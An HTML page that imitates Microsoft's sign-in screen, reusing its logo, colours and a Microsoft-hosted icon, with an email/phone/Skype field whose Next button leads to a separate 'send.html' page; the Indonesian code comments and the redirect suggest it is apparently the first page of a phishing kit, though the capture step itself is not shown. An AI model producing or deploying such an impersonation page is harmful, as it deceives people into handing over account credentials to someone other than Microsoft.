<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft - Sign in</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(to right bottom, #e6e6e6, #d9f0e6);
        }

        .signin-container {
            background-color: white;
            width: 380px;
            padding: 40px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
        }

        .microsoft-logo {
            margin-bottom: 16px;
        }

        .microsoft-logo img {
            height: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 20px;
            margin-top: 16px;
            color: #333;
        }

        .input-field {
            width: 100%;
            padding: 6px 0;
            margin-bottom: 8px;
            border: none;
            border-bottom: 1px solid #8e8e8e;
            font-size: 15px;
            outline: none;
        }

        .input-field:focus {
            border-bottom: 1px solid #0067b8;
        }

        .error-message {
            color: red;
            font-size: 13px;
            display: none;
            margin-bottom: 8px;
        }

        .no-account {
            font-size: 13px;
            margin-bottom: 24px;
        }

        .link {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
        }

        .link:hover {
            color: #005da6;
            text-decoration: underline;
        }

        .button-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 16px;
        }

        .next-button {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 8px 32px;
            font-size: 14px;
            cursor: pointer;
        }

        .options-container {
            background-color: white;
            width: 380px;
            margin-top: 16px;
            padding: 12px 40px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
            display: flex;
            align-items: center;
        }

        .key-icon {
            margin-right: 12px;
        }
    </style>
</head>
<body>
    <div class="signin-container">
        <div class="microsoft-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
        </div>
        <h1>Sign in</h1>
        
        <input type="text" id="input-field" class="input-field" placeholder="Email, phone, or Skype">
        <div class="error-message" id="error-message">Please enter your email, phone, or Skype.</div>

        <div class="no-account">
            No account? <a href="#" class="link">Create one!</a>
        </div>

        <div class="button-container">
            <button class="next-button" onclick="validateInput()">Next</button>
        </div>
    </div>
    
    <div class="options-container">
        <div class="key-icon">
            <img class="tile-img medium" src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg">
        </div>
        <span>Sign-in options</span>
    </div>

    <script>
        function validateInput() {
            let inputField = document.getElementById("input-field");
            let errorMessage = document.getElementById("error-message");

            if (inputField.value.trim() === "") {
                errorMessage.style.display = "block"; // Tampilkan pesan error
            } else {
                errorMessage.style.display = "none"; // Sembunyikan error jika diisi
                window.location.href = 'send.html'; // Pindah ke halaman berikutnya
            }
        }
    </script>
</body>
</html>
